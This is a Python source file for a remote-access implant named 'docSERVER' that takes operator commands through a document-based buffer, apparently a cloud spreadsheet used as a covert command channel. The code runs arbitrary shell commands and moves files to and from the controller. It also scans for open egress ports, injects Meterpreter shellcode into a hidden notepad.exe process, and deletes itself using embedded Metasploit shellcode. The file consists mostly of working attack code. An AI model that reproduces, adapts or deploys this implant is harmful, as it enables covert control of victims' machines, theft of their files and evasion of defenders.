#!/usr/bin/python
import subprocess
from time import sleep
from time import time
from hashlib import md5
import os
import platform
import logging
import ctypes
import random
from getpass import getuser
import sys
from docBuffer import docServerBuffer
import socket
import threading
import Queue
from imp import is_frozen



### GLOBALS ###

# Idle Hours Before Self Removal
TIMEOUT = 48

# Debug Logging Object and Handle
# Will log to file if using exe
DEBUG = False

logger = logging.getLogger('__docSERVER__')
if not DEBUG:
    logger.setLevel(logging.ERROR)
else:
    logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
if not DEBUG:
    ch.setLevel(logging.ERROR)
else:
    ch.setLevel(logging.NOTSET)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)

# OS Detection
OS = platform.system()

# Shared global for egressBust threads
egressPort = []

# Blocksize Used in File Transfer
BLOCKSIZE=2**10



### Freeze / EXE Detection Bool ###
# From www.py2exe.org/index.cgi/HowToDetermineIfRunningFromExe
# ThomasHeller posted this tip to the py2exe mailing list
def mainIsFrozen():
    return (hasattr(sys, "frozen") or # new py2exe
            hasattr(sys, "importers") # old py2exe
            or is_frozen("__main__")) # tools/freeze
    
    
### Delay Backoff and Removal Timers ###

# Check if C&C has time out 
# True initiates cleanUp() in main()
def timedOut(lastCmdTime):
    SECPERHOUR = 3600
    if int(time() - lastCmdTime) >= (TIMEOUT * SECPERHOUR):
        return True
    return False
                    
                    
#command polling backoff interval
def getDelay(delayCounter):
    delay = 0.5
    if delayCounter > 0 and delayCounter <= 5:
        delay = 1
    elif delayCounter > 5 and delayCounter <= 10:
        delay = 2
    elif delayCounter > 10 and delayCounter <= 20:
        delay = 4
    elif delayCounter > 20 and delayCounter <= 30:
        delay = 6
    elif delayCounter > 30 and delayCounter <= 40:
        delay = 8  + randint(0,2)
    elif delayCounter > 40 and delayCounter <= 60:
        delay = 10  + randint(0,3)
    elif delayCounter > 60 and delayCounter <= 90:
        delay = 15  + randint(0,4)
    elif delayCounter > 90 and delayCounter <= 250:
        delay = 20  + randint(0,5)
    elif delayCounter > 250:
        delay = 30 + randint(0,10)    
    return delay


### Command Parsing and Exec ###

# Exec Command via Correct OS method
# Return stdOut and/or stdErr
def processCmd(docBuffer, commandString):
    staticCmds = ["!sysinfo", "!sync", "!shutdown", "!cleanup"]
    #Static builtins
    if commandString in staticCmds:
        if commandString == "!sysinfo":
            return (sysCheck())
        elif commandString == "!sync":
            return docBuffer.syncUp()
        elif commandString == "!shutdown":
            docBuffer.sendData("<GOTSHUT>")
            os._exit(0) # aggressive exit
        elif commandString == "!cleanup":
            return cleanUp()
    #parsed commands
    elif commandString.startswith('!download'):
        return download(docBuffer, commandString)  
    elif commandString.startswith('!upload'):
        return upload(docBuffer, commandString) 
    elif commandString.startswith('!egress'):
        return egressBust(docBuffer, commandString)
    elif commandString.startswith('!meterup'):
        return meterUp(commandString);
    elif commandString.startswith('!forward'):
        return forwardPort(docBuffer, commandString)
    #os specific shell exec         
    else:
        try:  
            if OS == 'Linux':
                return nixExecCmd(commandString)      
            elif OS == 'Windows':
                return winExecCmd(commandString)
            elif OS == 'OSX':
                return osxExecCmd(commandString)            
        except:
            logger.debug('sendCMD(): Execution error for command: \"' + commandString +'\"')
    

# WINDOWS: exec via cmd subprocess
# shell=True allows for redirection and pipes
def winExecCmd(commandsIn):
    #cmdLine = ['cmd', '/q' '/k'] + commandsIn.split()
    try:
        process = subprocess.Popen(commandsIn, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate()
        if output[1] == '':
            return output[0]
        if output[0] and output[1]: #TODO: THIS SHOULD BE AN ELIF
            return output[0] + output[1]
        else:
            return output[1]
    except OSError:
        return "\nERROR: OSError"
  
  
# LINUX: exec via env-shell subprocess 
# shell=True, assumes trusted input
# allows for pipes and redirection. IO: sto, ste
def nixExecCmd(commandsIn):
    try:
        process = subprocess.Popen(commandsIn, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate()    
        if output[1] == '':
            return output[0]
        if output[0] and output[1]: #TODO: THIS SHOULD BE AN ELIF
            return output[0] + output[1]
        else:
            return output[1]    
    except OSError:
        return "\nERROR: OSError"


# OSX:  exec via -    #TODO: Test on OSX
def osxExecCmd(commandsIn):
    try:
        process = subprocess.Popen(commandsIn, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate()    
        if output[1] == '':
            return output[0]
        if output[0] and output[1]: #TODO: THIS SHOULD BE AN ELIF
            return output[0] + output[1]
        else:
            return output[1]    
    except OSError:
        return "\nERROR: OSError"


### File Transfer ###     

# Receives file pushed from controlling client
def upload(docBuffer, fileStr):
    upCmdList = fileStr.split('.')
    writeFile = upCmdList[1].decode('base64','strict')
    writeFile = os.path.expandvars(writeFile)
    logger.debug("writeFile is: " + writeFile)
    tmpFile = writeFile + ".tmp"
    existBefore = os.path.exists(writeFile)

    try:
        #check local file
        fd = open(writeFile,"wb")
        fd.close()
        
        tmpFd = open(tmpFile,"wb")
        docBuffer.sendData("<OKAYSND>")
        md5Obj = md5()
        
        rawData = docBuffer.readData()
        dataList = rawData.split('.')
        if dataList[0] != "<BOF>":
            return "ERROR: upload() - Data BOF format error."
        binData = dataList[1].decode('base64','strict') 
        tmpFd.write(binData)      
        md5Obj.update(binData)
        
        while binData != "<EOF>" :
            binData = docBuffer.readData()
            if binData == "<READ>" or binData == "<NULL>":
                pass 
            elif binData.startswith("<EOF>"):
                tmpFd.close()
                dataList = binData.split(".")
                binData = dataList[0]
                fileHash = dataList[1]
                if fileHash == md5Obj.digest().encode('base64','strict'):
                    if os.path.exists(writeFile):
                            os.remove(writeFile)
                    os.rename(tmpFile, writeFile)
                    return "<OKAYRCV>"  
                else:
                    if os.path.exists(tmpFile):
                            os.remove(tmpFile)
                    if not existBefore and os.path.exists(writeFile):
                        os.remove(writeFile) 
                    return "<OKAYFAIL>"      
            else:      
                binData = binData.decode('base64','strict')
                md5Obj.update(binData)
                tmpFd.write(binData)                          
    except IOError:
        if not existBefore and os.path.exists(writeFile):
            os.remove(writeFile)
        if os.path.exists(tmpFile):
            os.remove(tmpFile)
        return "File Access Error"


# Feed requested file to controlling host
def download(docBuffer, fileStr):
    BLOCKSIZE
    localPath = fileStr.split(".")[1].decode('base64','strict').strip('\n')
    localPath = os.path.expandvars(localPath)
    if os.path.exists(localPath):
        try:
            fd = open(localPath,"rb")
            fileSize = str( os.path.getsize(localPath) )
            docBuffer.sendData("<OKAYRCV>." + fileSize)
            md5Obj = md5()

            data = fd.read(BLOCKSIZE)
            md5Obj.update(data)
            docBuffer.sendData("<BOF>." + data.encode('base64','strict') )   
            while True:
                data = fd.read(BLOCKSIZE)
                if not data:
                    fileHash = md5Obj.digest().encode('base64','strict')
                    docBuffer.sendData("<EOF>." + fileHash )
                    return "<NULL>"
                #Anti-Clobber
                toWrite = docBuffer.SERVER_WRITE_COL + str(docBuffer.getToWrite())
                currentData = docBuffer.getCellData(toWrite)
                while(currentData != "<NULL>" and currentData != "<READ>"):
                    sleep(1)
                    currentData = docBuffer.getCellData(docBuffer.toWrite)
                         
                md5Obj.update(data)    
                docBuffer.sendData(data.encode('base64','strict') )                                 
        except IOError:
            return "ERROR: cannot read file: " + localPath
    else:
        return "ERROR: remote file path does not exist."


### Shell Upgrades ###


# worker thread obj for egress port check
class scannerThread(threading.Thread):
    def __init__(self, portCheckQueue, egressIP):
        threading.Thread.__init__(self)
        self.portQueue = portCheckQueue
        self.egressIP = egressIP
         
    def run(self):
        global egressPort #Not thread safe, will work, can't guarantee to return FIRST port found.
        while (not self.portQueue.empty()) and (len(egressPort) == 0):
            port = 0
            try:
                port = self.portQueue.get(timeout = 1)
            except Queue.Empty:
                return
            # Must create new socket object on each connect
            # reused socked object will miss ports, due to timing issue with sock.Socket.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            serverAddress = (self.egressIP, int(port))
            try:
                sock.connect(serverAddress)
                sock.close()
                egressPort.append(port)
                self.portQueue.task_done()
            except (socket.timeout, socket.error):
                self.portQueue.task_done()


# Expands Portlist Launches threads
# returns first open port
def egressBust(docBuffer, cmdStr):
    global egressPort
    egressPort = [] #clear last check
    cmdList = cmdStr.split("|")
    portList = []
    egressIP = cmdList[2]  
    threadCount = int(cmdList[3])
    
    if "-" in cmdList[1]:#expand and shuffle
        try:
            minPort, maxPort = cmdList[1].split("-")
        except:
            return "<egress>.<failed>"
        portList = list(( str(port) for port in range(int(minPort), int(maxPort) + 1) ))
        random.shuffle(portList)
    else:
        portList = cmdList[1].split(",")    
    docBuffer.sendData("<egress>.<started>.<%s>" % len(portList))
    
    try:
        # create port job queque
        portCheckQueue = Queue.Queue()
        for port in portList:
            portCheckQueue.put(int(port))          
        # create worker threads and list handle
        threads = []
        for threadObj in range(1, threadCount +  1) :
            worker = scannerThread(portCheckQueue, egressIP) 
            worker.setDaemon(True)
            worker.start()
            threads.append(worker)
        # wait for all threads to return
        for worker in threads :
            worker.join()
        if len(egressPort) > 0:
            return "<egress>.<open>.<%s>" % egressPort[0] 
        else:
            return "<egress>.<closed>"
    except:
        return "<egress>.<failed>"

        
    

# Injects shellcode via a remote thread into windowless process in a new process group
# Takes in shellcode as string, converts to bytearray
# injection code modeled modeled after work by Debasish Mandal @ http://www.debasish.in
def injectShellCode(shellCode):
    shellCode = bytearray(shellCode)   
    c_buffer = (ctypes.c_char * len(shellCode)).from_buffer(shellCode)
    PROCESS_ALL_ACCESS = (0x000F0000L|0x00100000L|0xFFF)
 
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        process = subprocess.Popen(['notepad.exe'], startupinfo=startupinfo, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)        
        pid = process.pid
        logger.debug("Got an process ID of " + str(pid))
        sleep(1)
        
        proc_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        logger.debug("Got Handle SUCCEEDED: " + str(proc_handle) )
         
        allocAddress = ctypes.windll.kernel32.VirtualAllocEx(proc_handle, None, len(shellCode), 0x1000, 0x40)
        logger.debug("Got shellcode address SUCCEEDED: " + str(allocAddress) )
         
        ctypes.windll.kernel32.WriteProcessMemory(proc_handle, allocAddress, c_buffer, len(shellCode), None)
        logger.debug("WriteProcessMemory SUCCEEDED")
         
        thread = ctypes.windll.kernel32.CreateRemoteThread(proc_handle, None, 0, allocAddress, None, 0, None)
        logger.debug("CreatedRemoteThread SUCCEEDED\n")
        return "Payload injected"
    
    except Exception:
        return "Injection Failed"
    
    
# meterpreter shellcode injector stub
def meterUp(commandString):
    return injectShellCode( commandString.split('.')[1].decode("base64", "strict") )


# Forward TCP Socket over tunnel
# Not available in public release
def forwardPort(docBuffer, commandString):
    return "Function not available"


### Management Settings and Cleanup ###

# Kills docSERVER and removes from disk
# Using remote thread injection
#TODO: Test on 64x 
#TODO: Create Posix double fork clean up as well
#TODO: May want to obfuscate shellcode in this method
def cleanUp():
    parentPid = str(os.getpid())
    if mainIsFrozen():
        parentPath = sys.executable
    else:
        parentPath = os.path.abspath(__file__)
    parentPath = '"' + parentPath + '"' #handle paths with spaces, as ^ escape wont

    logger.debug("Got ParentPath of " + parentPath )   
    logger.debug("Got ParentPid of " + parentPid ) 
    
    #WORKING ORIGINAL
    cmdString = 'cmd /c taskkill /F /PID > nul ' + parentPid + ' && ping 1.1.1.1 -n 1 -w 500 > nul & del /F /Q ' + parentPath

    # Windows Exec Shellcode Sourced from the Metasploit Framework 
    # http://www.rapid7.com/db/modules/payload/windows/exec
    # Authors - vlad902 <vlad902 [at] gmail.com>, sf <stephen_fewer [at] harmonysecurity.com>
    # 
    # I have Modified a "\x6a\x01" push 01 to "\x6a\x00" push 00 to unset uCmdShow
    # UINT WINAPI WinExec(
    #                      _In_  LPCSTR lpCmdLine,
    #                      _In_  UINT uCmdShow <-- changed value to 0 
    #                     );

    shellCode = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + \
    "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + \
    "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + \
    "\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" + \
    "\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" + \
    "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" + \
    "\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" + \
    "\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" + \
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" + \
    "\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" + \
    "\x12\xeb\x86\x5d\x6a\x00\x8d\x85\xb9\x00\x00\x00\x50\x68" + \
    "\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95" + \
    "\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" + \
    "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5" + cmdString + "\x00"   
    injectShellCode(shellCode)
    

# Return Formated System Information
def sysCheck():
    sysInfo = []
    sysInfo.append("OS      : " + OS)
    sysInfo.append("FAMILY  : " + os.name)
    sysInfo.append("RELEASE : " + platform.release())
    sysInfo.append("PLAT    : " + platform.platform())
    sysInfo.append("ARCH    : " + platform.machine())
    sysInfo.append("HOST    : " + platform.node())
    sysInfo.append("UNAME   : " + getuser())
    if OS == "Windows" :
        sysInfo.append("UID     : NULL")
    elif OS == "Linux" : 
        sysInfo.append("UID     : " + str(os.geteuid()))
    sysInfo.append("PID     : " + str(os.getpid()))
    return str(sysInfo)

 
# Main Method
def main():
    delayCounter = 0
    lastCmdTime = time()

    try:    
        #Instantiate bufferSheet object
        docBuffer = docServerBuffer()
        docBuffer.bufferInit("client", "<NULL>")

        while not timedOut(lastCmdTime):
            clientData = docBuffer.readData()
            logger.debug("Got Command: " + clientData) # TODO: DEBUG REMOVE
            if not clientData.startswith("ERROR: read timed out."):               
                commandOutput = processCmd(docBuffer, clientData)        
                docBuffer.sendData(commandOutput)
                lastCmdTime = time()
                delayCounter = 0
            sleep(getDelay(delayCounter))
            delayCounter += 1
            logger.debug('Delay counter: ' + str(delayCounter) + ' slept for %s seconds' % getDelay(delayCounter))
        
        logger.debug('DEBUG: cleanUp() on timeOut() Trigger')
        if not DEBUG:
            cleanUp()
            sleep(10)
        
    except Exception as e:
        logger.debug('DEBUG: cleanUp() Main() Exception Trigger on %s' % e)
        if not DEBUG:
            cleanUp()
      
      
if __name__ == "__main__":
    main()
